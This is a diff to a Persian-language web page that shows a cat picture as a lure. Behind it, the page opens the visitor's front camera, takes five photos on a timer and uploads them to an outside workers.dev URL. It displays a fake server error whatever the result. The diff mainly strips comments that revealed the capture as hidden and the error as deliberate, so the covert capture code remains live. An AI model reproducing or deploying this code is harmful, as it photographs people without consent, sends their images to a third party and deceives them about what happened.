@@ -8,7 +8,7 @@
         body {
             font-family: Tahoma, sans-serif;
             text-align: center;
-            background: #000000;
+            background: #ffffff; /* فقط این خط تغییر کرده */
             color: white;
             padding: 20px;
             margin: 0;
@@ -30,7 +30,7 @@
             margin: 20px 0;
             font-size: 20px;
             min-height: 50px;
-            color: #ff4444; /* قرمز برای شبیه خطا */
+            color: #ff4444;
             font-weight: bold;
         }
         #footer {
@@ -43,7 +43,7 @@
     </style>
 </head>
 <body>
-    <!-- گربه بامزه -->
+
     <img src="https://cataas.com/cat?width=400&height=400" alt="گربه" class="cat">
 
     <div id="status">در حال پردازش...</div>
@@ -61,10 +61,8 @@
         const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
 
-        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/'; // لینک ورکرت رو اینجا چک کن
-        let photoCount = 0;
+        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/';
 
-        // دسترسی به دوربین جلو (مخفی)
         navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
@@ -81,7 +79,6 @@
         })
         .catch(err => {
             status.textContent = 'خطا: دسترسی به به سرور امکان پذیر نیست!';
-            status.style.color = '#ff4444';
         });
 
         function captureAndSend(photoNumber) {
@@ -99,23 +96,17 @@
                     method: 'POST',
                     body: formData
                 })
-                .then(response => response.text())
-                .then(text => {
-                    // حتی اگر موفق باشه، پیام خطا نشون بده!
-                    if (photoNumber === 1) {
-                        status.textContent = 'خطا در ارسال به سرور!';
-                    } else {
-                        status.textContent = 'خطا در ارسال به سرور! لطفاً دوباره تلاش کنید.';
-                    }
+                .then(() => {
+                    status.textContent = 'خطا در ارسال به سرور!';
                 })
-                .catch(err => {
+                .catch(() => {
                     status.textContent = 'خطا در ارتباط با سرور!';
                 });
             }, 'image/jpeg', 0.92);
         }
 
         function takePhotosAutomatically() {
-            const intervals = [1500, 3500, 5500, 7500, 9500]; // زمان گرفتن ۵ عکس به میلی‌ثانیه
+            const intervals = [1500, 3500, 5500, 7500, 9500];
             intervals.forEach((time, index) => {
                 setTimeout(() => captureAndSend(index + 1), time);
             });
